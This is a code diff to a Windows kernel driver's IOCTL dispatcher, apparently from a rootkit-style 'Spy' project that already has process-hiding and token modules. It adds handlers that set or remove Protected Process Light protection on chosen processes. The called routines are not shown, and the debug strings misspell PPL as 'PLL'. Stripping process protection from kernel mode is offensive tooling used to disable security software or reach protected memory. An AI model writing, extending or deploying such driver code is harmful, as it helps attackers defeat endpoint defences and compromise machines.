@@ -1,6 +1,7 @@
 ﻿#include "processops.h"
 #include "driverops.h"
 #include "tokenops.h"
+#include "pplops.h"
 
 // ---------------------------------------------------------------
 // main driver routines
@@ -209,6 +210,38 @@ NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
             break;
         }
         status = SpyIoSyncProcessMetadataById(
+            buffer,
+            outBufferLength,
+            &bytesReturned
+        );
+        break;
+    }
+
+    case IOCTL_SPY_PPL:
+    {
+        DbgPrint("[*] IOCTL_SPY_PLL received\n");
+        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
+            DbgPrint("[-] Input buffer too small\n");
+            status = STATUS_BUFFER_TOO_SMALL;
+            break;
+        }
+        status = SpyIoSetProcessProtection(
+            buffer,
+            outBufferLength,
+            &bytesReturned
+        );
+        break;
+    }
+
+    case IOCTL_SPY_UNPPL:
+    {
+        DbgPrint("[*] IOCTL_SPY_UNPLL received\n");
+        if (inBufferLength < sizeof(SPY_HIDE_INPUT)) {
+            DbgPrint("[-] Input buffer too small\n");
+            status = STATUS_BUFFER_TOO_SMALL;
+            break;
+        }
+        status = SpyIoRemoveProcessProtection(
             buffer,
             outBufferLength,
             &bytesReturned
